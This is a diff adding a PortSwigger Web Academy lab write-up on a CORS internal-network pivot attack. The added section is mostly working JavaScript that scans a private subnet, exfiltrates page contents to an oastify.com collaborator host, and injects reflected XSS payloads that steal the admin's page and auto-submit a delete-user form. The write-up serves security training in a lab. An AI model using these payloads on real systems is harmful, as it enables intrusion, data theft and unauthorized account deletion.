@@ -6,6 +6,138 @@ ignore_macros: true
 
 # PortSwigger Web Academy
 
+## CORS
+
+### Insecure CORS allows internal network attacks
+
+> Lab: [CORS vulnerability with internal network pivot attack](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)
+
+**Goal:** Craft some JavaScript to locate an endpoint on the local network (192.168.0.0/24, port 8080) that you can then use to identify and create a CORS-based attack to delete a user.
+
+We can enumerate the internal network using a for loop and send it to the victim using the exploit server :
+
+```js
+for (let i = 0; i < 256; i++) {
+	let req = new XMLHttpRequest();
+	req.onload = handleResponse;
+	req.open('GET', `http://192.168.0.${i}:8080`, true);
+	req.send();
+
+	function handleResponse() {
+		fetch(`https://rrmydfoifg9zafyfe9hpcsrm4da4yumj.oastify.com/?match=${i}`);
+	};
+}
+```
+
+On the collaborator, we receive a match on ID `6` (`GET /?match=6`), this tells us that we have an http application on `http://192.168.0.6:8080`.
+
+Now, let's exfiltrate the internal website using POST request.
+
+```js
+let req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open("GET", "http://192.168.0.6:8080", true);
+req.send();
+
+function handleResponse() {
+	fetch("https://rrmydfoifg9zafyfe9hpcsrm4da4yumj.oastify.com?exfil", {
+		method: "POST",
+		body: "data=" + btoa(this.responseText)
+	});
+};
+```
+
+We successfully obtain a response on collaborator :
+
+```
+POST /?exfil HTTP/1.1
+Host: 1mo5n4kj374a7w34vjvumn0k0b62u0ip.oastify.com
+...
+User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36
+Referer: http://exploit-0ab200d2035fb2dec40dfaec017f0012.exploit-server.net/
+
+data=PCFET0NUWVBFIGh0...
+```
+
+I tried the same payload with `withCredentials` set to `true`, but we get no response. So, we can guess that `Access-Control-Allow-Credentials` is not allowed. I tried to exfiltrate the CORS policy of the internal web application using the function [getAllResponseHeaders](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/getAllResponseHeaders) but this function only returns the content of the following response header : `Cache-Control Content-Language Content-Type Expires Last-Modified Pragma` (from [stackoverflow.com](https://stackoverflow.com/a/14689355/11428808)).
+
+The internal app contains a POST form to login, if we add the parameters in the query, they will be reflected on the form. For example, with the query `/login?username=XYZ_CANARY_XYZ`, we will obtain the following form :
+
+```html
+<form class=login-form method=POST action=/login>
+    <input required type="hidden" name="csrf" value="Pr4ytojxkMioFjrlPJ0W0UTAdQ8N9YjW">
+    <label>Username</label>
+    <input required type=username name="username" value="XYZ_CANARY_XYZ">
+    <label>Password</label>
+    <input required type=password name="password">
+    <button class=button type=submit> Log in </button>
+</form>
+```
+
+The `username` parameter is vulnerable to XSS :
+
+```js
+const collabUrl = "https://rrmydfoifg9zafyfe9hpcsrm4da4yumj.oastify.com"; 
+const data = "username=" + encodeURIComponent(`X"><img src="${collabUrl}/img"><p div="`);
+let req = new XMLHttpRequest();
+req.onload = exfilResponse;
+req.open("GET", "http://192.168.0.6:8080/login?" + data, true);
+req.send();
+
+function exfilResponse() {
+	fetch(`${collabUrl}?exfil`, {
+		method: "POST",
+		body: "body=" + btoa(this.responseText)
+	});
+}
+```
+
+The injection seems to work :
+
+```html
+<!-- [...] -->
+<label>Username</label>
+<input required type=username name="username" value="X"><img src="https://rrmydfoifg9zafyfe9hpcsrm4da4yumj.oastify.com/img"><p div="">
+<!-- [...] -->
+```
+
+We can verify it by making the user visit the reflected XSS link :
+
+```js
+const collabUrl = "https://rrmydfoifg9zafyfe9hpcsrm4da4yumj.oastify.com"; 
+const data = "username=" + encodeURIComponent(`X"><img src="${collabUrl}/img"><p div="`);
+document.location.href="http://192.168.0.6:8080/login?" + data;
+```
+
+We receive a hit on `/img`, the XSS works ! Now let's try to exfiltrate the content as a logged user (victim account) using an `iframe` as we cannot use `withCredentials`. 
+
+```js
+const data = "username=" + encodeURIComponent(`"><iframe src="/" onload="new Image().src='https://rrmydfoifg9zafyfe9hpcsrm4da4yumj.oastify.com?body=' + btoa(this.contentWindow.document.body.innerHTML)"><p div="`);
+document.location.href="http://192.168.0.6:8080/login?" + data;
+```
+
+We receive a hit : `GET /?body=CiAgICAgICAgICAgIDxzY...`. The bot is logged as admin and we have a form to delete a user :
+
+```html
+<!-- [...] -->
+<form style="margin-top: 1em" class="login-form" action="/admin/delete" method="POST">
+    <input required="" type="hidden" name="csrf" value="iTW8O0qE5PM3uPmfs8culvp3jsdLYdn6">
+    <label>Username</label>
+    <input required="" type="text" name="username">
+    <button class="button" type="submit">Delete user</button>
+</form>
+<!-- [...] -->
+```
+
+Here is the final exploit that insert the username `carlos` and submit the form.
+
+```js
+const data = "username=" + encodeURIComponent(`"><iframe src="/" onload="let form=this.contentWindow.document.getElementsByClassName('login-form')[0];form.username.value='carlos';form.submit();"><p div="`);
+document.location.href="http://192.168.0.6:8080/login?" + data;
+```
+
+The lab is solved !
+
 ## HTTP Host Header attacks
 
 ### Password leak via dangling markup
